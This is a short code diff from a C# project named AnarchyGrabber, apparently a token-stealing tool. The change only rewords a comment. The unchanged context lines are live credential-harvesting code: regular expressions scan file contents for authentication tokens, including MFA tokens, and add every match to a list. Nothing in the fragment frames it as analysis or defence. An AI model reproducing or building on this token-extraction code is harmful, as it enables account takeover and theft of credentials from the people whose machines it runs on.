@@ -31,7 +31,7 @@ namespace AnarchyGrabber
                     foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                         tokens.Add(match.Value);
 
-                    //Get phone verified tokens
+                    //Get tokens where multi factor authentication is enabled
                     foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                         tokens.Add(match.Value);
                 }
